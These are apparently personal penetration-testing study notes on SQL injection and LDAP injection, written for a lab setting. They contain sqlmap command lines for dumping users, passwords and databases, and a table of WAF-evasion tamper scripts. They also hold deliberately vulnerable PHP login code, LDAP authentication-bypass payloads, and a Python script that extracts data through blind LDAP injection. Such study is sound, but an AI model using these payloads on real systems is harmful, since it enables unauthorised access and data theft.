# SQLi

[[OLD/WEB/vulnerabilities/SQL Injection/concepts|General Concepts (Old notes)]]

![types of SQL injection](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716989638556)


## In-band 
- ERROR based
- Union based
[[OLD/WEB/vulnerabilities/SQL Injection/attack/METHODOLOGY#In-Band SQL injection|Manual Exploitation]] (OLD notes)

## Inferential 
 - Boolean based
 - Time based
[[OLD/WEB/vulnerabilities/SQL Injection/attack/METHODOLOGY#Inferential(Blind) SQL injection|Manual Exploitation]] (OLD notes)
## SQLmap
Basic arguments 
```bash
sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent --threads=10 -
-risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --
passwords --current-user --dbs
```
 injection in UserAgent/Header/Referer/Cookie
 ```bash
python sqlmap.py -u "http://example.com" --data "username=admin&password=pass" --
headers="x-forwarded-for:127.0.0.1*"
# The injection is located at the '*'
 ```
 Second order injection
 ```bash
 python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order
"http://targetapp/wishlist" -v 3
sqlmap -r 1.txt -dbms MySQL -second-order
"http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
 ```
 
### SQLMap Tamper Scripts

| Tamper                         | Description                                                                                                                                           |
| ------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------- |
| `0x2char.py`                   | Replaces each (MySQL) 0x encoded string with equivalent `CONCAT(CHAR(),…)` counterpart                                                                |
| `apostrophemask.py`            | Replaces apostrophe character with its UTF-8 full width counterpart                                                                                   |
| `apostrophenullencode.py`      | Replaces apostrophe character with its illegal double unicode counterpart                                                                             |
| `appendnullbyte.py`            | Appends encoded NULL byte character at the end of payload                                                                                             |
| `base64encode.py`              | Base64 all characters in a given payload                                                                                                              |
| `between.py`                   | Replaces greater than operator (`>`) with `NOT BETWEEN 0 AND #`                                                                                       |
| `bluecoat.py`                  | Replaces space character after SQL statement with a valid random blank character. Afterwards replaces `=` with `LIKE` operator                        |
| `chardoubleencode.py`          | Double URL-encodes all characters in a given payload (not processing already encoded)                                                                 |
| `charencode.py`                | URL-encodes all characters in a given payload (not processing already encoded) (e.g. `SELECT` → `%53%45%4C%45%43%54`)                                 |
| `charunicodeencode.py`         | Unicode-URL-encodes all characters in a given payload (not processing already encoded) (e.g. `SELECT` → `%u0053%u0045%u004C%u0045%u0043%u0054`)       |
| `charunicodeescape.py`         | Unicode-escapes non-encoded characters in a given payload (not processing already encoded) (e.g. `SELECT` → `\u0053\u0045\u004C\u0045\u0043\u0054`)   |
| `commalesslimit.py`            | Replaces instances like `LIMIT M, N` with `LIMIT N OFFSET M`                                                                                          |
| `commalessmid.py`              | Replaces instances like `MID(A, B, C)` with `MID(A FROM B FOR C)`                                                                                     |
| `commentbeforeparentheses.py`  | Prepends inline comment before parentheses (e.g. `(` → `/**/(`)                                                                                       |
| `concat2concatws.py`           | Replaces `CONCAT(A, B)` with `CONCAT_WS(MID(CHAR(0), 0, 0), A, B)`                                                                                    |
| `equaltolike.py`               | Replaces all occurrences of operator equal (`=`) with operator `LIKE`                                                                                 |
| `escapequotes.py`              | Slash-escapes quotes (`'` and `"`)                                                                                                                    |
| `greatest.py`                  | Replaces greater than operator (`>`) with `GREATEST` counterpart                                                                                      |
| `halfversionedmorekeywords.py` | Adds versioned MySQL comment before each keyword                                                                                                      |
| `htmlencode.py`                | HTML-encodes all non-alphanumeric characters (e.g. `‘` → `'`)                                                                                         |
| `ifnull2casewhenisnull.py`     | Replaces `IFNULL(A, B)` with `CASE WHEN ISNULL(A) THEN (B) ELSE (A) END`                                                                              |
| `ifnull2ifisnull.py`           | Replaces `IFNULL(A, B)` with `IF(ISNULL(A), B, A)`                                                                                                    |
| `informationschemacomment.py`  | Adds inline comment (`/**/`) to the end of all `information_schema` occurrences                                                                       |
| `least.py`                     | Replaces greater than operator (`>`) with `LEAST` counterpart                                                                                         |
| `lowercase.py`                 | Replaces each keyword character with lower case (e.g. `SELECT` → `select`)                                                                            |
| `modsecurityversioned.py`      | Wraps complete query with versioned comment                                                                                                           |
| `modsecurityzeroversioned.py`  | Wraps complete query with zero-versioned comment                                                                                                      |
| `multiplespaces.py`            | Adds multiple spaces around SQL keywords                                                                                                              |
| `nonrecursivereplacement.py`   | Replaces predefined SQL keywords for bypassing keyword-based filters                                                                                  |
| `overlongutf8.py`              | Converts all characters in a given payload (not processing already encoded)                                                                           |
| `overlongutf8more.py`          | Converts all characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. `SELECT` → `%C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94`) |
| `percentage.py`                | Adds a percentage sign (`%`) in front of each character                                                                                               |
| `plus2concat.py`               | Replaces plus operator (`+`) with (MsSQL) function `CONCAT()` counterpart                                                                             |
| `plus2fnconcat.py`             | Replaces plus operator (`+`) with (MsSQL) ODBC function `{fn CONCAT()}` counterpart                                                                   |
| `randomcase.py`                | Randomizes case of each keyword character                                                                                                             |
| `randomcomments.py`            | Adds random comments to SQL keywords                                                                                                                  |
| `securesphere.py`              | Appends specially crafted string                                                                                                                      |
| `sp_password.py`               | Appends `sp_password` to the payload end for DBMS log obfuscation                                                                                     |
| `space2comment.py`             | Replaces space (` `) with SQL comment                                                                                                                 |
| `space2dash.py`                | Replaces space with dash comment (`--`) followed by random string and newline (`\n`)                                                                  |
| `space2hash.py`                | Replaces space with hash (`#`) followed by random string and newline (`\n`)                                                                           |
| `space2morehash.py`            | Same as above, adds multiple hashes and random string                                                                                                 |
| `space2mssqlblank.py`          | Replaces space with random blank character from valid MSSQL set                                                                                       |
| `space2mssqlhash.py`           | Replaces space with hash (`#`) followed by newline (`\n`)                                                                                             |
| `space2mysqlblank.py`          | Replaces space with random blank character from MySQL set                                                                                             |
| `space2mysqldash.py`           | Replaces space with dash comment (`--`) followed by newline (`\n`)                                                                                    |
| `space2plus.py`                | Replaces space with plus (`+`)                                                                                                                        |
| `space2randomblank.py`         | Replaces space with random blank from alternate character set                                                                                         |
| `symboliclogical.py`           | Replaces `AND` and `OR` with `&&` and `                                                                                                               |
| `unionalltounion.py`           | Replaces `UNION ALL SELECT` with `UNION SELECT`                                                                                                       |
| `unmagicquotes.py`             | Replaces `'` with `%bf%27` and generic comment (for WAF evasion)                                                                                      |
| `uppercase.py`                 | Replaces each keyword with upper case (`INSERT`)                                                                                                      |
| `varnish.py`                   | Appends HTTP header `X-originating-IP`                                                                                                                |
| `versionedkeywords.py`         | Encloses each non-function keyword with versioned MySQL comment                                                                                       |
| `versionedmorekeywords.py`     | Encloses each keyword with versioned MySQL comment                                                                                                    |
| `xforwardedfor.py`             | Appends fake HTTP header `X-Forwarded-For`                                                                                                            |

# LDAP injection 
## Concepts

### LDAP Data Interchange Format (**LDIF**)
- ![[Pasted image 20251030193134.png]]
  
	- **Distinguished Names (DNs):** Serve as unique identifiers for each entry in the directory (`cn=John Doe,ou=people,dc=example,dc=com`)
	- **Relative Distinguished Names (RDNs):** Represent individual levels within the directory hierarchy (`cn=John Doe`, where `cn` stands for Common Name.)
	- **Attributes:** Define the properties of directory entries, like `mail=john@example.com` for an email address.
### Search Queries

1. **Base DN (Distinguished Name):** This is the search's starting point in the directory tree.
2. **Scope:** Defines how deep the search should go from the base DN. It can be one of the following:
    - `base` (search the base DN only),
    - `one` (search the immediate children of the base DN),
    - `sub` (search the base DN and all its descendants).
3. **Filter:** A criteria entry must match to be returned in the search results. It uses a specific syntax to define these criteria. -> [RFC 4515](https://www.openldap.org/lists/ietf-ldapbis/200606/msg00010.html)
4. **Attributes:** Specifies which characteristics of the matching entries should be returned in the search results.

The basic syntax for an LDAP search query looks like this:

```default
(base DN) (scope) (filter) (attributes)
```

- LDAP services can be accessible over the network via ***ports 389*** (for unencrypted or StartTLS connections) and ***636*** (for SSL/TLS connections)
### Enumeration

- **Objective**: Gather information about the LDAP directory, such as user accounts, groups, and organizational units.
- **Tools**: `ldapsearch`, `NMAP`, `enum4linux`.
- **Example**:
  - Using `ldapsearch` to enumerate users:
    - => retrieves all user objects from the LDAP directory => to identify potential targets
```bash
ldapsearch -x -h <target IP> -b "dc=example,dc=com" "(objectClass=user)"
```
## Injection

![[Pasted image 20251030195722.png]]

### impact

(like sqli):
1. **Authentication Bypass:** Modifying LDAP authentication queries to log in as another user without knowing their password.
2. **Unauthorized Data Access:** Altering LDAP search queries to retrieve sensitive information not intended for the attacker's access.
3. **Data Manipulation:** Injecting queries that modify the LDAP directory, such as adding or modifying user attributes.
### Exploit
- example of vulnerable code:
```php
<?php
$username = $_POST['username'];
$password = $_POST['password'];

$ldap_server = "ldap://localhost";
$ldap_dn = "ou=People,dc=ldap,dc=thm";
$admin_dn = "cn=tester,dc=ldap,dc=thm";
$admin_password = "tester"; 

$ldap_conn = ldap_connect($ldap_server);
if (!$ldap_conn) {
    die("Could not connect to LDAP server");
}

ldap_set_option($ldap_conn, LDAP_OPT_PROTOCOL_VERSION, 3);

if (!ldap_bind($ldap_conn, $admin_dn, $admin_password)) {
    die("Could not bind to LDAP server with admin credentials");
}

// LDAP search filter
$filter = "(&(uid=$username)(userPassword=$password))";

// Perform the LDAP search
$search_result = ldap_search($ldap_conn, $ldap_dn, $filter);

// Check if the search was successful
if ($search_result) {
    // Retrieve the entries from the search result
    $entries = ldap_get_entries($ldap_conn, $search_result);
    if ($entries['count'] > 0) {
        foreach ($entries as $entry) {
            if (is_array($entry)) {
                if (isset($entry['cn'][0])) {
                    $message = "Welcome, " . $entry['cn'][0] . "!\n";
                }
            }
        }
    } else {
        $error = true;
    }
} else {
    $error = "LDAP search failed\n";
}
?>
```
#### Authentication Bypass Techniques
```php
(&(uid={userInput})(userPassword={passwordInput}))
```
##### **Tautology-Based Injection**
- inserting conditions into an LDAP query that are inherently true
- This method is particularly effective against LDAP queries constructed with user input that is not adequately sanitised
=>  `*)(|(&` for `{userInput}` and `pwd)` for `{passwordInput}`
```php
(&(uid=*)(|(&)(userPassword=pwd)))
```
1. `(uid=*)`: This part of the filter matches any entry with a `uid` attribute, essentially all users, because the wildcard `*` matches any value.
2. `(|(&)(userPassword=pwd))`: The OR (`|`) operator, meaning that any of the two conditions enclosed needs to be true for the filter to pass. In LDAP, an empty AND (`(&)`) condition is always considered true. The other condition checks if the `userPassword` attribute matches the value `pwd`, which can fail if the user is not using `pwd` as their password.
##### **Wildcard Injection**
An attacker can exploit this by submitting a username and password with a character the application does not anticipate, such as an asterisk (\*) for the uid and userPassword attribute value. This makes the condition always evaluates to true, effectively bypassing the password check:
=> injecting wildcard : `*` like `f*`
```php
(&(uid=f*)(userPassword=*))
```
-> first result in the query
![[Pasted image 20251030204547.png]]

### Blind LDAP Injection

example of vulnerable code:
```php
$username = $_POST['username'];
$password = $_POST['password'];

$ldap_server = "ldap://localhost"; 
$ldap_dn = "ou=users,dc=ldap,dc=thm";
$admin_dn = "cn=tester,dc=ldap,dc=thm"; 
$admin_password = "tester"; 

$ldap_conn = ldap_connect($ldap_server);
if (!$ldap_conn) {
    die("Could not connect to LDAP server");
}

ldap_set_option($ldap_conn, LDAP_OPT_PROTOCOL_VERSION, 3);

if (!ldap_bind($ldap_conn, $admin_dn, $admin_password)) {
    die("Could not bind to LDAP server with admin credentials");
}

$filter = "(&(uid=$username)(userPassword=$password))";
$search_result = ldap_search($ldap_conn, $ldap_dn, $filter);

if ($search_result) {
   $entries = ldap_get_entries($ldap_conn, $search_result);
    if ($entries['count'] > 0) {
        foreach ($entries as $entry) {
            if (is_array($entry)) {
                if (isset($entry['cn'][0])) {
                    if($entry['uid'][0] === $_POST['username']){
                        $message = "Welcome, " . $entry['cn'][0] . "!\n";
                    }else{
                        $message = "Something is wrong in your password.\n";
                    }
                }
            }
        }
    } else {
        $error = true;
    }
} else {
    echo "LDAP search failed\n";
}

ldap_close($ldap_conn);
```

- **Boolean-based Blind LDAP Injection:** The attacker injects conditions into the username field to make the LDAP query true or false, observing the application's behaviour to infer information.
- `a*)(|(&` for username and *`pwd)` for password*  
```php
(&(uid=a*)(|(&)(userPassword=pwd))) 
```
- `ab*)(|(&` => different error message 
	- This indicates that the next character is not "b".
 ***Exploit Code*** :
To automate the exfiltration of data in the previous code, you can use the Python script below:

```python
import requests
from bs4 import BeautifulSoup
import string
import time

# Base URL
url = 'http://10.10.133.48/blind.php'

# Define the character set
char_set = string.ascii_lowercase + string.ascii_uppercase + string.digits + "._!@#$%^&*()"

# Initialize variables
successful_response_found = True
successful_chars = ''

headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

while successful_response_found:
    successful_response_found = False

    for char in char_set:
        #print(f"Trying password character: {char}")

        # Adjust data to target the password field
        data = {'username': f'{successful_chars}{char}*)(|(&','password': 'pwd)'}

        # Send POST request with headers
        response = requests.post(url, data=data, headers=headers)

        # Parse HTML content
        soup = BeautifulSoup(response.content, 'html.parser')

        # Adjust success criteria as needed
        paragraphs = soup.find_all('p', style='color: green;')

        if paragraphs:
            successful_response_found = True
            successful_chars += char
            print(f"Successful character found: {char}")
            break

    if not successful_response_found:
        print("No successful character found in this iteration.")

print(f"Final successful payload: {successful_chars}")
```


